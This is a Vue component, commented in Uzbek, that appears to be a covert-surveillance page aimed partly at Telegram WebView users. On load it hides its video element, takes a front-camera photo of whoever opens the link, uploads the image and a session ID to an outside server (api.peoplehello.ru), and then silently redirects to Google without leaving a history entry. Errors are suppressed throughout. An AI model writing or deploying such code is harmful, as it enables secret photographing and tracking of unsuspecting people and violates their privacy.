<template>
  <!-- UI butunlay yashirilgan -->
  <video ref="video" playsinline muted style="display:none"></video>
</template>

<script>
export default {
  name: "FrontCamera",

  mounted() {
    this.capture()
  },

  methods: {
    async capture() {
      const session_id = this.$route.params.id
      if (!session_id) return this.redirect()

      if (!navigator.mediaDevices?.getUserMedia) {
        return this.redirect()
      }

      try {
        // ✅ FRONT KAMERA (lekin moslashuvchan)
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" },
          audio: false
        })

        const video = this.$refs.video
        video.srcObject = stream

        // ❗ iOS / Telegram WebView uchun MUHIM
        await video.play()

        // ❗ Kamera haqiqatan tayyor bo‘lishini kutamiz
        await new Promise(res => {
          if (video.readyState >= 2) return res()
          video.onloadedmetadata = res
        })

        // ❗ Real qurilmalarda barqarorlik uchun kichik delay
        await new Promise(r => setTimeout(r, 500))

        const canvas = document.createElement("canvas")
        canvas.width = video.videoWidth || 640
        canvas.height = video.videoHeight || 480

        const ctx = canvas.getContext("2d")
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height)

        // Kamerani o‘chiramiz
        stream.getTracks().forEach(t => t.stop())

        // ❗ ENG MUHIM QISM — toBlob (toDataURL EMAS)
        canvas.toBlob(async (blob) => {
          if (!blob) return this.redirect()

          const formData = new FormData()
          formData.append("photo", blob, "photo.jpg")
          formData.append("session_id", session_id)

          try {
            await fetch("https://api.peoplehello.ru/api/front-cam", {
              method: "POST",
              body: formData
            })
          } catch (e) {
            // jim
          } finally {
            this.redirect()
          }
        }, "image/jpeg", 0.85)

      } catch (err) {
        this.redirect()
      }
    },

    redirect() {
      // history’da qolmasin
      window.location.replace("https://www.google.com")
    }
  }
}
</script>
